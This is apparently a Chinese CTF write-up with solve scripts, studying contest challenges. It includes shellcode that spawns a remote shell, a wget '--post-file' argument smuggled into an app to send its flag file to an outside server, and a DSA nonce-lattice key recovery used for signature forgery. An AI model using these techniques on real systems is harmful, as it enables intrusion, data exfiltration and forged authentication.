<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">color = [<span class="string">'white'</span>, <span class="string">'orange'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>, <span class="string">'red'</span>, <span class="string">'green'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">breakdown</span><span class="params">(cube)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    tmp = cube</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">        res.append(color[tmp&amp;<span class="number">0b111</span>])</span><br><span class="line">        tmp &gt;&gt;= <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> res[::<span class="number">-1</span>]</span><br><span class="line">res = breakdown(<span class="number">0x64056d754259894604</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    print(i, res[i])</span><br></pre></td></tr></table></figure>
<h2 id="babywasi"><a href="#babywasi" class="headerlink" title="babywasi"></a>babywasi</h2><p>elf调用wasm</p>
<p>给一个随机数，加密发送的shellcode后运行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f16</span><span class="params">(a1)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (a1 &amp;<span class="number">1</span> <span class="keyword">and</span> a1 %<span class="number">3</span>):</span><br><span class="line">        v3 = <span class="number">7</span></span><br><span class="line">        <span class="keyword">while</span>((v3<span class="number">-6</span>)*(v3<span class="number">-6</span>) &lt; a1):</span><br><span class="line">            <span class="keyword">assert</span> v3 != <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> (a1%(v3<span class="number">-2</span>)!=<span class="number">0</span>):</span><br><span class="line">                <span class="keyword">assert</span> v3 != <span class="number">0</span></span><br><span class="line">                v1 = a1 % v3</span><br><span class="line">                v3 += <span class="number">6</span></span><br><span class="line">                <span class="keyword">if</span> v1 != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse10</span><span class="params">(a1)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    tmp = a1</span><br><span class="line">    <span class="keyword">while</span>(tmp):</span><br><span class="line">        res = tmp % <span class="number">10</span> + res * <span class="number">10</span></span><br><span class="line">        tmp //= <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f18</span><span class="params">(a1)</span>:</span></span><br><span class="line">    v3 = reverse10(a1)</span><br><span class="line">    <span class="keyword">if</span> v3 != a1 <span class="keyword">and</span> f16(a1)!= <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">return</span> f16(v3) != <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f19</span><span class="params">(a1)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(sum&lt;a1+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> f18(i):</span><br><span class="line">            k = i</span><br><span class="line">            sum += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"121.37.164.32"</span>, <span class="number">19008</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"Your lucky number: "</span>)</span><br><span class="line">rand = int(p.recvline().strip())</span><br><span class="line">log.success(rand)</span><br><span class="line">s = <span class="string">b""</span></span><br><span class="line">shellcode = <span class="string">b"\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">    print(f19(rand+i), i)</span><br><span class="line">    s+=bytes([(f19(rand+i)&amp;<span class="number">0xff</span>)^shellcode[i]])</span><br><span class="line">log.success(s.ljust(<span class="number">64</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">p.send(s.ljust(<span class="number">64</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="fxck"><a href="#fxck" class="headerlink" title="fxck!"></a>fxck!</h2><p>base58，之后用brainfuck语言加密，但是代码可能写错了，每次加密的都是上一位的结果。修改之后的版本改为直接对比编码结果，解base58即可。</p>
<p>base58编码部分也有bug，存放结果的位置没有初始化为0，导致存放了一些垃圾数据，体现在解密后为\x06开头。位数短的话这里会是\xE0。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">tab = <span class="string">b'ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b58encode</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> tab</span><br><span class="line">    num = bytes_to_long(s)</span><br><span class="line">    res = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">while</span>(num):</span><br><span class="line">        res = bytes([tab[num%<span class="number">58</span>]]) + res</span><br><span class="line">        num //= <span class="number">58</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b58decode</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> tab</span><br><span class="line">    tmp = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[::<span class="number">-1</span>]:</span><br><span class="line">        tmp += bytes([tab.index(i)])</span><br><span class="line">    pow = <span class="number">1</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line">        res += pow*tmp[i]</span><br><span class="line">        pow *= <span class="number">58</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(res)[:]</span><br><span class="line"></span><br><span class="line">print(b58decode(<span class="string">b"4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe"</span>))</span><br></pre></td></tr></table></figure>
<h1 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h1><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>socket一建立会告诉随机数，用这个随机数加密message后跟check校验。</p>
<p>有个secret.txt，告诉了ip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The%20IP%20of%20the%20remote%20phone%20is%20212.64.66.177</span><br></pre></td></tr></table></figure>
<p>直接按程序的逻辑发包就行，注意文件的路径在apk包目录的文件下面，wget把文件读到远程服务器。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line">p = remote(<span class="string">"212.64.66.177"</span>, <span class="string">"8080"</span>)</span><br><span class="line">key = p.recvline().strip()</span><br><span class="line">log.success(<span class="string">b"key: "</span>+key)</span><br><span class="line"></span><br><span class="line">message = <span class="string">b"[your server] --post-file=/data/data/com.xuanxuan.getflag/files/flag"</span></span><br><span class="line">hashed = hmac.new(key, message, sha1)</span><br><span class="line">check = hashed.hexdigest().encode()</span><br><span class="line">payload = <span class="string">b"&#123;\"message\":\""</span>+message+<span class="string">b"\",\"check\":\""</span> + check + <span class="string">b"\"&#125;"</span></span><br><span class="line">log.success(<span class="string">b"payload: "</span> + payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h2><p>flag{shijiejiayou}</p>
<h2 id="ez-mem-amp-usb"><a href="#ez-mem-amp-usb" class="headerlink" title="ez_mem&amp;usb"></a>ez_mem&amp;usb</h2><p>流量包打开之后发现有两个上传data.zip的流量，把zip提取出来后，发现两个是相同的文件。任取一个解压，是一个vmem内存镜像文件，用volatility解析，发现内存中有文件\Device\HarddiskVolume1\Documents and Settings\Administrator\flag.img，提取出来，发现有密码。继续用volatility分析进程，发现有个cmd进程，用cmdscan插件查看命令，得到压缩包密码<code>weak_auth_top100</code>,解压出一个usbdata.txt文件，常规套路解析usb流量可得flag:FLAG[69200835784EC3ED8D2A64E73FE913C0]，大写转小写，[]转{}即可。</p>
<h2 id="Misc-隐藏的信息"><a href="#Misc-隐藏的信息" class="headerlink" title="Misc-隐藏的信息"></a>Misc-隐藏的信息</h2><p>二维码反色之后补全是假的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_is_also_not_flag&#125;</span><br><span class="line">解压密码不在这里0.0！</span><br></pre></td></tr></table></figure>
<p>ZIP是伪加密，解密的WAV文件包含一些DTMF信息<br><img src="https://i.loli.net/2020/03/10/rBm7FbIcnCgHvQk.png" alt="image.png"><br><img src="https://i.loli.net/2020/03/10/Zuj1AOhi3lPzB5I.png" alt="image.png"></p>
<p>对照下图还原信息：187485618521</p>
<p><img src="https://i.loli.net/2020/03/10/KhVFBnIp8uqTclw.png" alt="image.png"></p>
<p>strings了一下原来二维码的图片，发现提示用base64来getflag</p>
<p><img src="https://i.loli.net/2020/03/10/PZ2IrtoagE8pSdj.png" alt="image.png"></p>
<p>最后flag就是flag{MTg3NDg1NjE4NTIx}</p>
<h2 id="武汉加油"><a href="#武汉加油" class="headerlink" title="武汉加油"></a>武汉加油</h2><p>给了一张图片 </p>
<p>后面padding了一个rar文件</p>
<p>vmp壳，直接用x64dbg不能调试。可以等运行起来attach上。然后直接能dump出来，估计vmp没有用好。正常vmp壳没这么好脱的。主逻辑很简单，输入6组字符串，按中文编码直接对比<code>&#39;</code>,<code>武</code>,<code>汉</code>,<code>加</code>,<code>油</code>,<code>!</code>，然后打印flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ flag.exe</span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">武</span></span><br><span class="line"><span class="string">汉</span></span><br><span class="line"><span class="string">加</span></span><br><span class="line"><span class="string">油</span></span><br><span class="line"><span class="string">!</span></span><br><span class="line"><span class="string">flag : &#123;zhong_guo_jia_you&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="简单Misc"><a href="#简单Misc" class="headerlink" title="简单Misc"></a>简单Misc</h2><p>题目给的一个jpg图片和zip压缩包，压缩包有密码，先把图片拉到winhex发现，本来是一个zip压缩包，，然后后缀改成压缩包打开有一个txt文件，里面是摩斯密码解密得到字符串是另一个压缩包文件的密码，打开这个压缩包，里面还有一个txt，把里面内容base64解密得到flag</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="NHP"><a href="#NHP" class="headerlink" title="NHP"></a>NHP</h2><p>类似TetCTF2019的yaecc<br><a href="https://colab.research.google.com/github/nguyenduyhieukma/CTF-Writeups/blob/master/TetCTF/2020/tetctf.ipynb" target="_blank" rel="noopener">https://colab.research.google.com/github/nguyenduyhieukma/CTF-Writeups/blob/master/TetCTF/2020/tetctf.ipynb</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_PoW</span><span class="params">(suffix, h)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"solving PoW......"</span></span><br><span class="line">    charset = [chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">255</span>)]</span><br><span class="line">    <span class="keyword">for</span> p1 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> p2 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> p3 <span class="keyword">in</span> charset:</span><br><span class="line">                plaintext = p1 + p2+ p3+ suffix</span><br><span class="line">                m = hashlib.sha256()</span><br><span class="line">                m.update(plaintext)</span><br><span class="line">                <span class="keyword">if</span> m.hexdigest() == h:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"PoW solution has been found!"</span></span><br><span class="line">                    <span class="keyword">return</span> p1+p2+p3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'121.37.174.33'</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : r.sendline(s)</span><br><span class="line">rl = <span class="keyword">lambda</span>  : r.recvline()</span><br><span class="line">sd = <span class="keyword">lambda</span> s : r.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n=<span class="number">4096</span> : r.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : r.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(m)</span>:</span></span><br><span class="line">    l = <span class="number">40</span> - len(m)</span><br><span class="line">    res = <span class="string">'0'</span>*l + m</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getsign</span><span class="params">(name)</span>:</span></span><br><span class="line">    ru(<span class="string">'$'</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Please input your username: '</span>)</span><br><span class="line">    sl(name)</span><br><span class="line">    ru(<span class="string">'k.bit_length() == '</span>)</span><br><span class="line">    kbits = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">    ru(<span class="string">'Here is your signature in hex: '</span>)</span><br><span class="line">    sign = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> sign,kbits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(x,q,p,g)</span>:</span></span><br><span class="line">    m = <span class="string">'admin'</span></span><br><span class="line">    Hm = int(sha256(m).hexdigest(),<span class="number">16</span>)</span><br><span class="line">    k = <span class="number">2</span></span><br><span class="line">    k_inv = number.inverse(k, q)</span><br><span class="line">    r = pow(g, k, p) % q</span><br><span class="line">    s = (k_inv * (Hm + x * r)) % q</span><br><span class="line">    res = <span class="string">'admin'</span>.encode(<span class="string">'hex'</span>) + pad(hex(r)[<span class="number">2</span>:]) + pad(hex(s)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">'$'</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'Please send me your signature: '</span>)</span><br><span class="line">    sl(res)</span><br><span class="line">    print(res)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">ru(<span class="string">'sha256(XXX + '</span>)</span><br><span class="line">suffix = (ru(<span class="string">')'</span>)[:<span class="number">-1</span>]).decode(<span class="string">'hex'</span>)</span><br><span class="line">ru(<span class="string">'== '</span>)</span><br><span class="line">h = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">p = solve_PoW(suffix, h)</span><br><span class="line">p = p.encode(<span class="string">'hex'</span>)</span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'p = '</span>)</span><br><span class="line">p = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">ru(<span class="string">'q = '</span>)</span><br><span class="line">q = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">ru(<span class="string">'g = '</span>)</span><br><span class="line">g = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">ru(<span class="string">'y = '</span>)</span><br><span class="line">y = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">print(<span class="string">'p = '</span> + str(p))</span><br><span class="line">print(<span class="string">'q = '</span> + str(q))</span><br><span class="line">print(<span class="string">'g = '</span> + str(g))</span><br><span class="line">print(<span class="string">'y = '</span> + str(y))</span><br><span class="line">qbits = q.bit_length()</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000000</span>):</span><br><span class="line">    data,kbits = getsign(<span class="string">'ver'</span>)</span><br><span class="line">    <span class="keyword">if</span> qbits-kbits&gt;=<span class="number">8</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        success(<span class="string">'[+]Round: '</span>+ str(count))</span><br><span class="line">        m1 = int(data[:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">        r1 = int(data[<span class="number">6</span>:<span class="number">46</span>],<span class="number">16</span>)</span><br><span class="line">        s1 = int(data[<span class="number">-40</span>:],<span class="number">16</span>)</span><br><span class="line">        res.append((m1,(r1,s1)))</span><br><span class="line">    <span class="keyword">if</span> count&gt;=<span class="number">40</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/home/anemone/SageMath/data.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(str(res))</span><br><span class="line"></span><br><span class="line">arg_list = [str(x) <span class="keyword">for</span> x <span class="keyword">in</span> [p,q,g,y]]</span><br><span class="line"></span><br><span class="line">SAGE = process([<span class="string">"/home/anemone/SageMath/sage"</span>, <span class="string">"/home/anemone/SageMath/exp.sage"</span>] + arg_list)</span><br><span class="line">x = int(SAGE.recvline().strip())</span><br><span class="line">SAGE.close()</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">sign(x,q,p,g)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>exp.sage</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/home/anemone/SageMath/data.txt"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d = f.readline()</span><br><span class="line">d = d.split(<span class="string">','</span>)</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(d),<span class="number">3</span>):</span><br><span class="line">    m = int(d[i][<span class="number">2</span>:])</span><br><span class="line">    r = int(d[i+<span class="number">1</span>][<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">    s = int(d[i+<span class="number">2</span>][<span class="number">1</span>:<span class="number">-3</span>].rstrip(<span class="string">'L'</span>))</span><br><span class="line">    data.append((m,(r,s)))</span><br><span class="line"><span class="keyword">assert</span> len(argv[<span class="number">1</span>:]) == <span class="number">4</span></span><br><span class="line"></span><br><span class="line">[p,q,g,y] = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> argv[<span class="number">1</span>:]]</span><br><span class="line"></span><br><span class="line">n = q</span><br><span class="line">Zn = Zmod(n)</span><br><span class="line"></span><br><span class="line">size = len(data)<span class="number">-1</span></span><br><span class="line">m = []</span><br><span class="line">Ai = [<span class="number">-1</span>]</span><br><span class="line">Bi = [<span class="number">0</span>]</span><br><span class="line">r0, s0 = map(Zn, data[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">z0 = Zn(ZZ(sha256(hex(data[<span class="number">0</span>][<span class="number">0</span>])[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)).hexdigest(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">    message, sig = data[i+<span class="number">1</span>]</span><br><span class="line">    ri, si = map(Zn, sig)</span><br><span class="line">    zi = z = Zn(ZZ(sha256(hex(message)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)).hexdigest(), <span class="number">16</span>))</span><br><span class="line">    A = - (s0 * ri) / (r0 * si)</span><br><span class="line">    B = (z0 * ri) / (si * r0) - zi / si</span><br><span class="line">    Ai.append(A)</span><br><span class="line">    Bi.append(B)</span><br><span class="line"></span><br><span class="line">Ai.append(<span class="number">0</span>)</span><br><span class="line">res = n//<span class="number">2</span>^<span class="number">8</span></span><br><span class="line">Bi.append(res)</span><br><span class="line">m.append(Ai)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">    m.append([<span class="number">0</span>]*(i+<span class="number">1</span>) + [n] + [<span class="number">0</span>]*(size-i))</span><br><span class="line"></span><br><span class="line">m.append(Bi)</span><br><span class="line">m = Matrix(ZZ, m)</span><br><span class="line"></span><br><span class="line">mLLL = m.LLL()</span><br><span class="line"></span><br><span class="line"><span class="comment">#print mLLL</span></span><br><span class="line"><span class="keyword">for</span> irow, row <span class="keyword">in</span> enumerate(mLLL):</span><br><span class="line">    k0 = Zn(row[<span class="number">0</span>])</span><br><span class="line">    x = (s0*k0-z0)/r0</span><br><span class="line">    x = x%q</span><br><span class="line">    <span class="keyword">if</span> pow(g, x, p) == y:</span><br><span class="line">        print(<span class="string">"&#123;:d&#125;"</span>.format(int(x)))</span><br><span class="line">    k0 = Zn(-row[<span class="number">0</span>])</span><br><span class="line">    x = (s0*k0-z0)/r0</span><br><span class="line">    x = x%q</span><br><span class="line">    <span class="keyword">if</span> pow(g, x, p) == y:</span><br><span class="line">        print(<span class="string">"&#123;:d&#125;"</span>.format(int(x)))</span><br></pre></td></tr></table></figure>
<h2 id="lancet"><a href="#lancet" class="headerlink" title="lancet"></a>lancet</h2><p>RSA parity oracle</p>
